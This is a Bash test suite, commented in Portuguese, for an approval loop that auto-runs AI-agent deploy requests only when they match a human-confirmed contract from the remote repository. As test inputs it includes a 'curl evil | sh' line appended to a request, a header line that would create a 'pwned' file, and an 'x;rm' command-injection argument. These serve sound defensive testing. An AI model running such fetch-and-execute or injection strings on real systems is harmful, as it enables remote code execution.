#!/usr/bin/env bash
# Testes do `oute approve --dark <rodada>` (#843, ADR-10): o laço do host que executa, sem perguntar, só o pedido da rodada cujo
# script tem o hash de um dos três scripts do contrato `.oute/deploy.toml` na ponta do ramo padrão do origin.
# Bash puro, sem Docker nem rede: `docker` falso (o container "existe" enquanto $F_UP existir; `docker exec` roda o comando
# local com HOME=$F_CTR_HOME) e o remoto é um repo bare local, que o `git fetch` do HOST enxerga no lugar do GitHub (insteadOf).
# O contrato é lido pelo host, fora do container (ajuste 1 da auditoria): o clone do "container" ($WORK) não entra na conta.
# Uso: tests/oute-approve-dark.test.sh   (sai != 0 se algum caso falhar)
set -uo pipefail
# credenciais reais nunca chegam ao scripts/oute daqui
for v in $(compgen -e | grep -E '^(OCI_|GH_TOKEN$|GITHUB_TOKEN$|AGENT_STUDIO_|BW_)' || true); do unset "$v"; done

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
OUTE="$ROOT/scripts/oute"
TMP="$(mktemp -d)"
LOOPS=""
cleanup() { local p; for p in $LOOPS; do kill "$p" 2>/dev/null || true; done; rm -rf "${TMP:?}"; return 0; }
trap cleanup EXIT
. "$ROOT/tests/lib/check.sh"
CHECK_OUT=30

BIN="$TMP/bin"; mkdir -p "$BIN"
cat > "$BIN/docker" <<'SH'
#!/usr/bin/env bash
up() { [[ -e "$F_UP" ]]; return $?; }
case "$1" in
  ps)   up && echo abc123; exit 0 ;;
  exec) shift; [[ "$1" == -i ]] && shift; shift
        up || { echo "Error response from daemon: No such container: oute-agent" >&2; exit 1; }
        HOME="$F_CTR_HOME" exec "$@" ;;
  *)    exit 9 ;;
esac
SH
cat > "$BIN/oute-emit" <<'SH'
#!/usr/bin/env bash
echo "$*" >> "$F_EMITS"
SH
chmod +x "$BIN/docker" "$BIN/oute-emit"

export PATH="$BIN:$PATH" OUTE_HOST=teste OUTE_INSTANCE=teste
export F_UP="$TMP/up" F_CTR_HOME="$TMP/ctr" F_EMITS="$TMP/emits" F_RUNS="$TMP/runs" F_REMOTE="$TMP/remote.git"
# o "GitHub" do teste: o repo bare local (vale para o git do host; o do container nem é chamado)
export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0="url.$F_REMOTE.insteadOf" GIT_CONFIG_VALUE_0="https://github.com/testowner/proj.git"
export OUTE_DARK_WORKSPACE="$TMP" OUTE_DARK_OWNER=testowner OUTE_DARK_POLL=0.2 OUTE_DARK_CONTRACT_TTL=0
G=(git -c user.email=t@t -c user.name=t)
WORK="$TMP/proj"   # o repo "do container": /workspace/proj

# script do contrato: grava uma linha em $F_RUNS com o nome dele
script_of() { local n="$1"; printf '#!/usr/bin/env bash\nset -euo pipefail\necho "%s" >> "$F_RUNS"\necho "feito %s"\n' "$n" "$n"; return 0; }
# contrato novo no remoto e clone do container; $1 = o que o deploy.sh imprime (muda o hash)
mk_repo() {
  local seed="$TMP/seed" deploy="${1:-deploy}"
  rm -rf "${TMP:?}/seed" "${TMP:?}/remote.git" "${TMP:?}/proj"
  git init -q "$seed" -b main && mkdir -p "$seed/.oute"
  script_of "$deploy" > "$seed/.oute/deploy.sh"; script_of verify > "$seed/.oute/verify.sh"; script_of rollback > "$seed/.oute/rollback.sh"
  chmod 755 "$seed"/.oute/*.sh
  printf 'deploy = ".oute/deploy.sh"\nverify = ".oute/verify.sh"\nrollback = ".oute/rollback.sh"\nhost = "oute-server"\n' > "$seed/.oute/deploy.toml"
  "${G[@]}" -C "$seed" add -A && "${G[@]}" -C "$seed" commit -qm contrato
  git init -q --bare "$F_REMOTE" -b main
  git -C "$seed" push -q "$F_REMOTE" main
  git clone -q "$F_REMOTE" "$WORK"
  git -C "$WORK" remote set-url origin "https://github.com/testowner/proj.git"
  return 0
}
# round <rodada> [dark|nodark]: meta da rodada no container
mk_round() {
  local r="$1" dark="${2:-dark}"
  mkdir -p "$F_CTR_HOME/.oute/swarm/$r"
  { printf 'repo=%s\nmax=3\n' "$WORK"; [[ "$dark" != dark ]] || printf 'dark=1\n'; } > "$F_CTR_HOME/.oute/swarm/$r/meta"
  return 0
}
reset() {
  rm -rf "${TMP:?}/host" "${TMP:?}/ctr" "${F_EMITS:?}" "${F_RUNS:?}"; mkdir -p "$TMP/host" "$F_CTR_HOME/outbox" "$F_CTR_HOME/inbox"
  : > "$F_RUNS"; touch "$F_UP"
  return 0
}
# propose <id> <rodada|-> <como> <corpo do arquivo de script, já pronto na entrada padrão>: pedido na outbox como o oute-propose o grava
propose() {
  local id="$1" rodada="$2" como="${3:-user}"
  { printf '# oute-propose\n# titulo: deploy %s\n# como: %s\n# agente: claude\n# criado: 2026-10-12T00:00:00Z\n' "$id" "$como"
    [[ "$rodada" == - ]] || printf '# rodada: %s\n' "$rodada"
    printf '\n'; cat; } > "$F_CTR_HOME/outbox/$id.sh"
  return 0
}
runs_dir="$TMP/host/.oute/approve/runs"
# start <rodada> [log]: liga o laço em segundo plano; $PID = pid
start() {
  local r="$1" log="${2:-$TMP/dark.log}"
  HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark "$r" ${DARKREPO-proj} > "$log" 2>&1 &
  PID=$!; LOOPS="$LOOPS $PID"
  return 0
}
# until_ <segundos> <comando…>: espera o comando dar certo
until_() {
  local n=$(( $1 * 10 )) i=0; shift
  while ! "$@" >/dev/null 2>&1; do i=$((i + 1)); (( i < n )) || return 1; sleep 0.1; done
  return 0
}
# stop_ <rodada>: fecha a rodada pela marca e espera o laço sair; $RC = código
stop_() {
  local r="$1"
  : > "$F_CTR_HOME/.oute/swarm/$r/fechada"
  until_ 15 bash -c '! kill -0 "$1" 2>/dev/null' _ "$PID" || { kill "$PID" 2>/dev/null; RC=124; return 0; }
  wait "$PID"; RC=$?
  return 0
}
inbox() { local i="$1"; cat "$F_CTR_HOME/inbox/$i.out" 2>/dev/null; return 0; }
ran() { local n="$1"; grep -cx "$n" "$F_RUNS" || true; return 0; }
D_OK="$(script_of deploy)"
FILA="fica na fila manual"   # a frase que o laço avisa (uma constante só: S1192)
printf 's\n' > "$TMP/tty-sim"; export OUTE_APPROVE_TTY="$TMP/tty-sim"   # o "humano" confirma o contrato na partida do laço

# --- 1. hash igual: executa sem perguntar e registra human-dark
mk_repo; reset; mk_round swarm-t1; id=20261012-010101-deploy-ok
propose "$id" swarm-t1 <<<"$D_OK"
start swarm-t1
until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
R="$(inbox "$id")"
check "hash igual: o script rodou uma vez"                   test "$(ran deploy)" = 1
check "hash igual: rc 0 no resultado"                        grep -q '^# rc: 0$' <<<"$R"
check "hash igual: o resultado leva '# aprovador: human-dark'" grep -qx '# aprovador: human-dark' <<<"$R"
check "hash igual: a saída do script voltou"                 grep -q 'feito deploy' <<<"$R"
check "hash igual: pedido movido para outbox/done"           test -f "$F_CTR_HOME/outbox/done/$id.sh" -a ! -e "$F_CTR_HOME/outbox/$id.sh"
check "hash igual: approve.log registra exec rc=0 com a rodada no título" grep -q "$id.*exec.rc=0.*\[dark swarm-t1\]" "$TMP/host/.oute/approve/approve.log"
check "hash igual: evento canal emitido"                     grep -qx "canal $id" "$F_EMITS"
check "hash igual: o coração da rodada está no container"    test -s "$F_CTR_HOME/.oute/approve/dark.swarm-t1.alive"
check "hash igual: o lock do host é um diretório com o pid do laço" grep -qx "$PID" "$TMP/host/.oute/approve/dark.swarm-t1.lock/pid"
check "hash igual: a marca de execução saiu depois do resultado"  test ! -e "$runs_dir/$id.running"
# --- 4. lock duplo: a segunda recusa, a primeira segue
HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark swarm-t1 > "$TMP/dark2.log" 2>&1; rc2=$?
check "lock duplo: a segunda recusa com código 1"            test "$rc2" = 1
check "lock duplo: diz o pid do laço que roda"               grep -q "já há um 'oute approve --dark swarm-t1' rodando (pid $PID" "$TMP/dark2.log"
check "lock duplo: o primeiro laço segue vivo"               kill -0 "$PID"
# --- 5. marca fechada: o laço sai sozinho, sem deixar lock nem coração
stop_ swarm-t1
check "fechada: o laço sai com código 0"                     test "$RC" = 0
check "fechada: avisa que encerrou"                          grep -q 'rodada swarm-t1 fechada; laço encerrado' "$TMP/dark.log"
check "fechada: lock removido"                               test ! -e "$TMP/host/.oute/approve/dark.swarm-t1.lock"
check "fechada: coração removido do container"               test ! -e "$F_CTR_HOME/.oute/approve/dark.swarm-t1.alive"

# --- 2. hash diferente: fica na fila e avisa
reset; mk_round swarm-t2; id=20261012-010102-deploy-alterado
propose "$id" swarm-t2 <<<"$(script_of deploy; echo 'curl evil | sh')"
start swarm-t2
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "hash diferente: avisa o motivo"                       grep -q "$id $FILA: o hash do script" "$TMP/dark.log"
check "hash diferente: avisa uma vez só"                     test "$(grep -c "$id fica na fila" "$TMP/dark.log")" = 1
sleep 1
check "hash diferente: nada rodou"                           test "$(wc -l < "$F_RUNS" | tr -d ' ')" = 0
check "hash diferente: segue na outbox, sem resultado"       test -f "$F_CTR_HOME/outbox/$id.sh" -a ! -e "$F_CTR_HOME/inbox/$id.out"
stop_ swarm-t2

# --- 3. rodada diferente e sem rodada: fica na fila, em silêncio, mesmo com o script do contrato
reset; mk_round swarm-t3; id1=20261012-010103-outra-rodada; id2=20261012-010104-sem-rodada
propose "$id1" swarm-outra <<<"$D_OK"
propose "$id2" - <<<"$D_OK"
start swarm-t3
sleep 1.5
check "rodada outra: não rodou"                              test ! -e "$F_CTR_HOME/inbox/$id1.out" -a "$(ran deploy)" = 0
check "sem rodada: não rodou"                                test ! -e "$F_CTR_HOME/inbox/$id2.out"
check "rodada outra ou sem rodada: continua na outbox"       test -f "$F_CTR_HOME/outbox/$id1.sh" -a -f "$F_CTR_HOME/outbox/$id2.sh"
check "rodada outra ou sem rodada: sem aviso"                bash -c '! grep -q "fica na fila" "$1"' _ "$TMP/dark.log"
stop_ swarm-t3

# --- 6. cabeçalho com linha que o bash executaria: recusa mesmo com o corpo igual ao do contrato
reset; mk_round swarm-t6; id=20261012-010106-cabecalho-sujo
{ printf '# oute-propose\n# titulo: x\n# como: user\n# rodada: swarm-t6\ntouch %s/pwned\n\n' "$TMP"; printf '%s\n' "$D_OK"; } > "$F_CTR_HOME/outbox/$id.sh"
start swarm-t6
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "cabeçalho sujo: avisa o formato"                      grep -q "$id $FILA: o cabeçalho tem linha fora do formato" "$TMP/dark.log"
check "cabeçalho sujo: nada executou (nem o touch)"          test ! -e "$TMP/pwned" -a "$(ran deploy)" = 0
stop_ swarm-t6

# --- 7. pedido --root nunca sai pelo laço
reset; mk_round swarm-t7; id=20261012-010107-como-root
propose "$id" swarm-t7 root <<<"$D_OK"
start swarm-t7
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "--root: fica na fila e diz o motivo"                  grep -q "$id $FILA: pedido --root" "$TMP/dark.log"
check "--root: nada rodou"                                   test "$(ran deploy)" = 0
stop_ swarm-t7

# --- 8. o contrato é o da ponta do remoto, não o da árvore de trabalho do clone: script trocado só na árvore não passa
mk_repo; reset; mk_round swarm-t8; id=20261012-010108-arvore-de-trabalho
script_of evil > "$WORK/.oute/deploy.sh"
propose "$id" swarm-t8 <<<"$(script_of evil)"
start swarm-t8
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "árvore de trabalho: script só local não passa"        grep -q "$id $FILA: o hash do script" "$TMP/dark.log"
check "árvore de trabalho: nada rodou"                       test "$(ran evil)" = 0
stop_ swarm-t8
# ... e o script commitado só no clone (sem push) também não: a ponta vem do remoto, depois do fetch
mk_repo; reset; mk_round swarm-t8b; id=20261012-010108-commit-local
script_of evil > "$WORK/.oute/deploy.sh"; "${G[@]}" -C "$WORK" commit -qam "so local"
propose "$id" swarm-t8b <<<"$(script_of evil)"
start swarm-t8b
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "commit só local: não passa"                           grep -q "$id $FILA: o hash do script" "$TMP/dark.log"
check "commit só local: nada rodou"                          test "$(ran evil)" = 0
stop_ swarm-t8b

# --- 9. o clone do container não é fonte: refs e config plantados nele não mudam o contrato lido pelo host (ajuste 1 da auditoria)
mk_repo; reset; mk_round swarm-t9; id=20261012-010109-clone-plantado
git -C "$WORK" checkout -q -b plantado
script_of evil > "$WORK/.oute/deploy.sh"; "${G[@]}" -C "$WORK" commit -qam "contrato plantado"
mkdir -p "$WORK/.git/refs/remotes/origin"; git -C "$WORK" symbolic-ref refs/remotes/origin/HEAD refs/heads/plantado
git -C "$WORK" update-ref refs/remotes/origin/main "$(git -C "$WORK" rev-parse plantado)"
git -C "$WORK" config remote.origin.fetch '+refs/heads/plantado:refs/remotes/origin/main'
git -C "$WORK" config remote.origin.url "$WORK"
propose "$id" swarm-t9 <<<"$(script_of evil)"
start swarm-t9
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "clone plantado (origin/HEAD, fetch, url): o script plantado não passa" grep -q "$id $FILA: o hash do script" "$TMP/dark.log"
check "clone plantado: nada rodou"                           test "$(ran evil)" = 0
stop_ swarm-t9
# ... e o contrato de verdade, do remoto, segue valendo com o mesmo clone plantado
reset; mk_round swarm-t9b; id=20261012-010109-clone-plantado-ok
propose "$id" swarm-t9b <<<"$D_OK"
start swarm-t9b
until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
check "clone plantado: o script do remoto roda"              test "$(ran deploy)" = 1
stop_ swarm-t9b
# dono sem esse repo: o fetch do host falha e nada roda
mk_repo; reset; mk_round swarm-t9c; id=20261012-010109-outro-dono
propose "$id" swarm-t9c <<<"$D_OK"
out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_DARK_OWNER=intruso "$OUTE" approve --dark swarm-t9c proj 2>&1)"; rc=$?
check "dono sem o repo: o fetch do host falha, avisa e sai com 1" bash -c '[ "$1" = 1 ] && grep -q "git fetch de intruso/proj falhou" <<<"$2"' _ "$rc" "$out"
check "dono sem o repo: nada rodou"                          test "$(ran deploy)" = 0

# --- 10. rodada aberta sem --dark: o laço não executa nada
mk_repo; reset; mk_round swarm-t10 nodark; id=20261012-010110-sem-dark
propose "$id" swarm-t10 <<<"$D_OK"
start swarm-t10
until_ 15 grep -q "não foi aberta com --dark" "$TMP/dark.log"
sleep 1
check "sem dark=1 no meta: avisa e não executa"              test "$(ran deploy)" = 0 -a ! -e "$F_CTR_HOME/inbox/$id.out"
stop_ swarm-t10

# --- 11. sem quebra de linha no fim do pedido: o corpo normalizado ainda é o do contrato
mk_repo; reset; mk_round swarm-t11; id=20261012-010111-sem-newline
printf '%s' "$D_OK" | propose "$id" swarm-t11
start swarm-t11
until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
check "sem newline no fim: ainda é o script do contrato" test "$(ran deploy)" = 1
stop_ swarm-t11

# --- 12. marca de parada (oute-swarm stop, fatia d): o laço sai
mk_repo; reset; mk_round swarm-t12
start swarm-t12
until_ 10 test -s "$F_CTR_HOME/.oute/approve/dark.swarm-t12.alive"
: > "$F_CTR_HOME/.oute/swarm/swarm-t12/dark.stop"
until_ 15 bash -c '! kill -0 "$1" 2>/dev/null' _ "$PID"
check "dark.stop: o laço saiu"                               bash -c '! kill -0 "$1" 2>/dev/null' _ "$PID"
check "dark.stop: avisa que parou"                           grep -q 'rodada swarm-t12 parada; laço encerrado' "$TMP/dark.log"

# --- 13. lock velho (pid morto) não trava a rodada
mk_repo; reset; mk_round swarm-t13
mkdir -p "$TMP/host/.oute/approve/dark.swarm-t13.lock"; echo 999999 > "$TMP/host/.oute/approve/dark.swarm-t13.lock/pid"
start swarm-t13
until_ 10 test -s "$F_CTR_HOME/.oute/approve/dark.swarm-t13.alive"
check "lock de pid morto: o laço assume"                     grep -qx "$PID" "$TMP/host/.oute/approve/dark.swarm-t13.lock/pid"
stop_ swarm-t13

# --- 13b. repo do meta fora de /workspace/<nome>: o laço não executa nada
mk_repo; reset; mk_round swarm-t13b; id=20261012-010113-repo-fora
printf 'repo=/tmp/evil/proj\ndark=1\n' > "$F_CTR_HOME/.oute/swarm/swarm-t13b/meta"
propose "$id" swarm-t13b <<<"$D_OK"
start swarm-t13b
until_ 15 grep -q "traz um repo fora de" "$TMP/dark.log"
sleep 1
check "repo do meta fora de /workspace: avisa e não executa"  test "$(ran deploy)" = 0 -a ! -e "$F_CTR_HOME/inbox/$id.out"
stop_ swarm-t13b

# --- 13c. refs/replace no clone do container não muda o conteúdo lido (GIT_NO_REPLACE_OBJECTS)
mk_repo; reset; mk_round swarm-t13c; id=20261012-010114-replace
old="$(git -C "$WORK" rev-parse HEAD:.oute/deploy.sh)"
new="$(script_of evil | git -C "$WORK" hash-object -w --stdin)"
git -C "$WORK" replace -f "$old" "$new"
propose "$id" swarm-t13c <<<"$(script_of evil)"
start swarm-t13c
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "refs/replace: o script trocado por replace não passa"  test "$(ran evil)" = 0
stop_ swarm-t13c

# publica no remoto um deploy.sh novo (o contrato muda) e devolve
push_contract() {
  local body="$1"
  printf '%s\n' "$body" > "$TMP/seed/.oute/deploy.sh"
  "${G[@]}" -C "$TMP/seed" commit -qam "contrato novo" && git -C "$TMP/seed" push -q "$F_REMOTE" main
  return 0
}
# --- 15. contrato novo exige reiniciar o laço (âncora humana, sem busca por pedido)
mk_repo; reset; mk_round swarm-t15; id=20261012-010115-ponta-muda
NOVO="$(script_of deploy-v2)"
propose "$id" swarm-t15 <<<"$NOVO"
start swarm-t15
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "confirmação: o laço mostrou repo, commit e hashes"    bash -c 'grep -q "proj" <<<"$1" && grep -qE "commit: [0-9a-f]{40}" <<<"$1" && grep -q "^deploy " <<<"$1" && grep -q "^rollback " <<<"$1"' _ "$(cat "$TMP/dark.log")"
push_contract "$NOVO"
sleep 1.5
check "contrato muda com o laço de pé: o pedido segue na fila (sem busca nova)" test "$(ran deploy-v2)" = 0 -a ! -e "$F_CTR_HOME/inbox/$id.out"
stop_ swarm-t15
rm -f "$F_CTR_HOME/.oute/swarm/swarm-t15/fechada"
start swarm-t15
until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
check "laço reiniciado: contrato novo confirmado, o pedido roda uma vez" test "$(ran deploy-v2)" = 1
stop_ swarm-t15

# --- 15b. sem confirmação do humano o laço nem liga
mk_repo; reset; mk_round swarm-t15c; id=20261012-010119-sem-confirmar
propose "$id" swarm-t15c <<<"$D_OK"
printf 'n\n' > "$TMP/tty-nao"
out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_APPROVE_TTY="$TMP/tty-nao" "$OUTE" approve --dark swarm-t15c proj 2>&1)"; rc=$?
check "sem confirmação: sai com 1 e diz que nada será executado" bash -c '[ "$1" = 1 ] && grep -q "não confirmado" <<<"$2"' _ "$rc" "$out"
check "sem confirmação: nada rodou e o lock saiu"            test "$(ran deploy)" = 0 -a ! -e "$TMP/host/.oute/approve/dark.swarm-t15c.lock"
# o repo oute-agent é recusado, no comando e no meta
out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark swarm-t15c oute-agent 2>&1)"; rc=$?
check "oute-agent no comando: recusa com 2"                  bash -c '[ "$1" = 2 ] && grep -q "recusa o repo oute-agent" <<<"$2"' _ "$rc" "$out"
mk_round swarm-t15d
printf 'repo=%s/oute-agent\ndark=1\n' "$TMP" > "$F_CTR_HOME/.oute/swarm/swarm-t15d/meta"
out="$(DARKREPO= HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark swarm-t15d 2>&1)"; rc=$?
check "oute-agent no meta (sem repo no comando): recusa"     bash -c '[ "$1" != 0 ] && grep -q "recusa o repo oute-agent" <<<"$2"' _ "$rc" "$out"

# --- 15c. meta forjado com outro repo não é aceito; repo omitido: o nome do meta vale só depois da confirmação
mk_repo; reset; mk_round swarm-t15e; id=20261012-010120-meta-forjado
printf 'repo=%s/outro\ndark=1\n' "$TMP" > "$F_CTR_HOME/.oute/swarm/swarm-t15e/meta"
propose "$id" swarm-t15e <<<"$D_OK"
start swarm-t15e
until_ 15 grep -q "não o confirmado 'proj'" "$TMP/dark.log"
sleep 1
check "meta com outro repo: avisa e não executa"             test "$(ran deploy)" = 0 -a ! -e "$F_CTR_HOME/inbox/$id.out"
stop_ swarm-t15e
mk_round swarm-t15f; id=20261012-010121-repo-omitido
propose "$id" swarm-t15f <<<"$D_OK"
DARKREPO= start swarm-t15f
until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
check "repo omitido: o nome do meta é mostrado, confirmado e o pedido roda" bash -c 'grep -q "abriu com o repo .proj." <<<"$1" && grep -q "contrato de deploy do modo dark" <<<"$1"' _ "$(cat "$TMP/dark.log")"
stop_ swarm-t15f

# --- 16. pedido marcado em execução antes de rodar (ajuste 5): outro `oute approve` não repete, o laço não repete
mk_repo; reset; mk_round swarm-t16; id=20261012-010117-lento
LENTO="$(script_of lento; echo 'sleep 3')"
push_contract "$LENTO"
propose "$id" swarm-t16 <<<"$LENTO"
start swarm-t16
until_ 15 test -d "$runs_dir/$id.running"
check "em execução: a marca existe com o pid do laço"        grep -qx "$PID" "$runs_dir/$id.running/pid"
out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve "$id" 2>&1)"
check "em execução: o approve avulso não vê o pedido pendente" grep -q "não está pendente" <<<"$out"
until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
check "em execução: rodou uma vez só"                        test "$(ran lento)" = 1
check "em execução: a marca saiu com o resultado"            until_ 5 test ! -e "$runs_dir/$id.running"
stop_ swarm-t16
# marca de um processo que morreu: o pedido não volta à fila e o aviso diz onde olhar
reset; mk_round swarm-t16b; id=20261012-010118-marca-velha
mkdir -p "$runs_dir/$id.running"; echo 999999 > "$runs_dir/$id.running/pid"
propose "$id" swarm-t16b <<<"$LENTO"
out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve 2>&1)"
check "marca velha: não executa e avisa onde conferir"       bash -c '! grep -q "executando" <<<"$1" && grep -q "ficou marcado em execução" <<<"$1"' _ "$out"
check "marca velha: nada rodou"                              test "$(ran lento)" = 0

# --- 17. o laço dark não reescreve o runs/<id>.sh que o humano revê, e o humano confere o sha depois do `s`
mk_repo; reset; mk_round swarm-t17; id=20261012-010122-humano
propose "$id" swarm-t17 <<<"$D_OK"
FIFO="$TMP/tty-fifo"; rm -f "$FIFO"; mkfifo "$FIFO"
HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_APPROVE_TTY="$FIFO" "$OUTE" approve "$id" > "$TMP/humano.log" 2>&1 &
HPID=$!; LOOPS="$LOOPS $HPID"
until_ 10 grep -q "executar?" "$TMP/humano.log"
SHA0="$(sha256sum "$runs_dir/$id.sh" | cut -d' ' -f1)"
# outro arquivo do mesmo pedido chega à outbox e o laço dark lê tudo que está pendente
{ printf '# oute-propose\n# titulo: x\n# como: user\n# rodada: swarm-t17\n\n'; script_of reescrito; } > "$F_CTR_HOME/outbox/$id.sh"
start swarm-t17
until_ 15 grep -q "$FILA" "$TMP/dark.log"
check "humano revendo: o laço dark não mexeu no runs/<id>.sh" test "$(sha256sum "$runs_dir/$id.sh" | cut -d' ' -f1)" = "$SHA0"
check "humano revendo: o laço usa arquivo próprio"           test -f "$runs_dir/dark.$id.sh"
# o arquivo mostrado muda embaixo do humano (outra sessão): o `s` não executa
printf '#!/usr/bin/env bash\necho trocado >> "$F_RUNS"\n' >> "$runs_dir/$id.sh"
echo s > "$FIFO"
until_ 10 bash -c '! kill -0 "$1" 2>/dev/null' _ "$HPID"
check "sha mudou depois de mostrado: aborta e nada roda"     grep -q "mudou depois de mostrado" "$TMP/humano.log"
check "sha mudou depois de mostrado: nada executou"          test "$(ran trocado)" = 0 -a "$(ran reescrito)" = 0
stop_ swarm-t17

# --- 18. o laço dark executa; o humano que estava com o prompt aberto não repete o pedido
mk_repo; reset; mk_round swarm-t18; id=20261012-010123-nao-repete
propose "$id" swarm-t18 <<<"$D_OK"
HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_APPROVE_TTY="$FIFO" "$OUTE" approve "$id" > "$TMP/humano2.log" 2>&1 &
HPID=$!; LOOPS="$LOOPS $HPID"
until_ 10 grep -q "executar?" "$TMP/humano2.log"
start swarm-t18
until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
echo s > "$FIFO"
until_ 10 bash -c '! kill -0 "$1" 2>/dev/null' _ "$HPID"
check "já executado pelo laço: o humano diz que já foi decidido" grep -q "já foi decidido" "$TMP/humano2.log"
check "já executado pelo laço: rodou uma vez só"             test "$(ran deploy)" = 1
stop_ swarm-t18

# --- 14. argumento ruim: sai antes de qualquer docker
out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark 'x;rm' 2>&1)"; rc=$?
check "rodada inválida: código 2 e uso"                      bash -c '[ "$1" = 2 ] && grep -q "rodada inválida" <<<"$2"' _ "$rc" "$out"
out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark 2>&1)"; rc=$?
check "--dark sem rodada: código 2"                          test "$rc" = 2

check_end
